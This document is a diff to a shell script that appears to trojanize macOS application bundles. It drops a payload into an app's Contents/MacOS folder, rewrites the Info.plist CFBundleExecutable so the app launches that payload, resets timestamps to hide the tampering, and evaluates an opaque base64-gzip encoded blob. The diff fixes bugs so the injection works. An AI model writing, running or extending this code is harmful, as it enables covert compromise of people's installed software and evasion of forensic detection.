@@ -140,7 +140,7 @@ fi
 ### 4 Setup advanced functions
 
 # Import PlistKeyMod
-b64gzdecode "H4sIAGfgbloCA5VW204cORB9tr+iYpRMQOlZQS4v7PAURYtWiSKxeUIIWd1u2poeu2W7h2VD/n1dvvRtBq32AbDdp47rcqoMpd9bad2f4umrrt6e/qSyhltgDF5t8PfdpWuEokT8Ld39Tldiw4xwvVGMitaK2QdcMlpLSjsjlbvvLX8QSElE2WgoBLAfeATSwuTStW2guK23u/3d5nbP217c+X1zx+gvSkvuyuZeGBN4TuBadb1Dgnfw2AgjANfeRfAQbaD0jkAlbGlk56RW4DRU0nYtf1pTEkIr/pnGRUpuBR5IRQGAECDnp3FFotvs7Sl801DLVoDtu66VolqzDLm8TKuLQ6ubTpSy9nDYiqd3sFp5n7kFpR3UuleVvzO4jtRHGN8fMn5BJ1YrqLSIPD7l1h2x/XBo+xVT421ltMRQtHFHY/n4ws3Gx7P34SQKDl17/PpPC4Ifaqv0owJuHvqdUG5MJHzhspXqAT8h72p1yHb2AttY8jVWqBI171sHO2GDyialz5yZUlhehlXQcDwK1BHoJRw+Iv898m9Qiidw45XfDffsubGUYvE23i73Bq8Y9eXGo6BlXOjeedVuGO+dZhSZ/uCq8gmVqOajHUcoqX1wEjXC2GWlMXwy02vYsh2XyncQO/UbUmrlpOoFjbESUtSbs+eiCE4Oaay9T/DmDUz/pk/ZlY13ZR2qO7RKKkGON27H/BHfnEEkC3Hkr0MjA/sYboXsjVwUp9gGnzGJg8spowvgLgBD5gdkrMMBdB+gsSIDdijQAqwDOFUto4HkMh7gG49uRNtl3hP4jgMQ8CwnYDISF+Zno9myT7LxJHmfGNaHzVIYSh00TSqtRJrMns4KAxb7TemB0/pBOOE7T0w4tqdCvPnr8/U3X3z8OhwGAQ+zc8gHYsbkkN22kgaKDttpSouiCg3iWZ+fD0ZxgL1azuekt6DTJL0k06KeAU1CmQiZSTn5HW9NZznAbD9azF++ce4E2ih5spD0Rcpi7BA6hf0nK1z9T+rwO2NT181fBDqneD9QoGmyPMmvWsddMw5kSo6pAw1FO03po5FOzIrnxziWJweIW+WLcc7SJtaFHq/MVGUHlbH+zSkkPl74PwTY11frs99/e33lf1jMXc5GQL6AmcX+WVa+LWqpwuO8iPpiFnXspesacLT48aamjyfMmunD2Ey/6L/hF3g5WgkAAA==" "evaluate"
+b64gzdecode "H4sIAFRmb1oCA6VWW2+bSBR+Zn7FyRjXly2mTto8OOtoK1XVRttUkZK+NLUiCoMZGQ8IhmQTx/995wwMYOJcpH2wmeHMd67fOcNFzHP5D7s/T4LhaEN68I37TORsBlcRg/OzK/MChmozUgc+FzJKMvhZPDwUPkRSpvnMdZdcRsXviZ+s3VLiEsJDuAZqD30vjlkGH0YUDuZAKSxOZMQEsdi/XN6sk4DNacZkkQlKWJyzHQEuKQk5IWnGhbwpcm/J0FWL+VECDgP6A18Bz+GiCWaSR+Bch6v17WJ+fevFBVuofbSgZEuI70k/umFZpvX04EykhUQF9vQ93EUsY2qFe+UmqGMqXF85AwHL/YynkicCZAIBz9PYu58QS0fqPKhgD5voLN9TaaP2lAIXBAAsC6zpqFxZpft0aE9H8D2BkMcM8iJNY86CCTWHTk6q1eE+3GXKfB4qAKzY/XsY2OoxUBF4OYhEQpgUIlC2dRhoYI/eo316v6IzAxshAwgSVqpTlcjlHhUf96k4x3wNbKzhADOJCjC8JJN74/v0rB+ZivFWhVgp8SCN9/tx3FHxQ6xEcifAy5bFmgnZpBe+ejzmYoki1DuwjwZP9Y2f0dcQYoKVC1joFbGENcs1D1vEMDqNSpZ7vl5plpevtGpFG71VNNditHCDFub2FAnbg0vVH2lt69bLckKwPnNKiekgL6BEMQBfacbjIimk4vaceoVMKEFNf3siUGnlyHnTouPdzrSIFaoQOXKH2n/RkyDBNFgNpzlyWr+g9gc6Uk/LT4TkomCkDNiynHA+fnQc7WWdy3BO7Q3vjedbCu/egd6G7q9fbnvfV79eb3x9cD3LU89ns8ViuzXJrFzehDN70wu3zrFCzpXzE82Luv2q0pU5skODbjJvqcbXBOsQy0jrIQH0k/bNrqeSWtYVMnHxTq2dlY4e61EHr4tjwu+eX+vzupY1oKzsc4hbjShLXUOqyj+HSTSmYoUBgWVo8hwsUqCIxamx0oMLnMaA70zGWvO5Ax83sG5TGnAr28cUmag59lrWNc90V1lBIlh1eygrubpvcux5kdSmcjWoW2amL6nH+6YiWpmaskEur76cfVcUQ2RXpjusHv5NQstVQ/GupG8WexhvrVcBz8BJoTnujre07R/6XnaAngDKucdHcxuVMuOTBhyUEuyL1lVVtckGn61ubL3tl499TlbXX/hUbabQQ+9uBdTFu8ndLJlUg5edgCbLlhrISNvD45ush3/9Ppr5HXtipcyokLUhq1OTeZP3MupdkSmXcafGZ90vkWbKK5nellTqDILDlzhTjhvSxr7JHJw2bv9v0/rfKKgG3O4NTnb1Hr2sF/VV6nrmOyX1ZNRcpsR6c1ehNhY/4e1dxuUuTZEjSJ1lxlJw8BJS7GmRxaQRzwlNsqG9wY07G7vbP6ajEa2kyCgtGM9cTSHyIon29PUTEuXqY8ThMBjoj0+79AHy/ulk/KfbP7X1BFar2t9WRTT2zaid5H/hgZpnIRf6a6+T9sPX015OxrMQtJznov1BBjuj8eMro3FL/gO+kOTUNwwAAA==" "evaluate"
 
 ### 5 Begin injection phase
 # This is where the fun begins...
@@ -149,15 +149,14 @@ b64gzdecode "H4sIAGfgbloCA5VW204cORB9tr+iYpRMQOlZQS4v7PAURYtWiSKxeUIIWd1u2poeu2W
 ### 6 Gather information
 
 # Get original executable path
-originalExecutable="$target/Contents/MacOS/$(PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable")"
-	
-reconTargets=("$target" "$target/Contents" "$target/Contents/Info.plist" "$target/Contents/MacOS" "$originalExecutable")
+originalExecutable="$target/Contents/MacOS/$(PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable")" && originalExecutable="${originalExecutable/<string>/}" && originalExecutable="${originalExecutable/<\/string>/}"
 
+reconTargets=("$target" "$target/Contents" "$target/Contents/Info.plist" "$target/Contents/MacOS" "$originalExecutable")
 	
 # Get timestamps and permissions for reconTargets
 for ((i=0;i<=$((${#reconTargets[@]}-1));i++));do
 	timestamp[i]="$(stat -f "%Sm" -t "%m%d%H%M%y" "${reconTargets[i]}")"
-	permissions[i]="$(stat -f '%A %a %N' "${reconTargets[i]}")"
+	permissions[i]="$(stat -f '%A' "${reconTargets[i]}")"
 done
 
 # Setup Payload name
@@ -170,7 +169,7 @@ fi
 
 # Setup Payload permission
 if [ -z "$permission" ];then
-	permission="$(stat -f '%A %a %N' "${reconTargets[5]}")"
+	permission="$(stat -f '%A' "${reconTargets[4]}")"
 fi
 
 ### 7 Remove obstacles
@@ -194,14 +193,19 @@ if [ "$exitOnObstructions" == "false" ];then
 		fi
 	done
 fi
-
 ### 8 Inject payload
 
 # Drop payload
-cp -T "$payload" "$payloadname"
+cp "$payload" "$target/Contents/MacOS/$payloadname" # DOES NOT COPY # BUG
+
+###################################################################################################
+###################################################################################################
+###################################################################################################
+###################################################################################################
+###################################################################################################
 
 # Rebind app to launch payload instead of old executable
-PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable" -v="$payloadname"
+PlistKeyMod -f="$target/Contents/Info.plist" -m="write" -k="CFBundleExecutable" -v="$payloadname"
 # Well that was much easier with that library...
 
 ### 9 Hide traces
@@ -218,10 +222,9 @@ if [ "$hidden" == "true" ];then
 		touch -m "${timestamp[i]}" "${reconTargets[i]}"
 	done
 	# Set the dropped payloads timestamp to same as original executable
-	touch -m "${timestamp[5]}" "$target/Contents/MacOS/$payloadname}"
+	touch -m "${timestamp[4]}" "$target/Contents/MacOS/$payloadname"
 fi
 ### 10 Exit
 # Thats all folks!
 
 exit 0
-
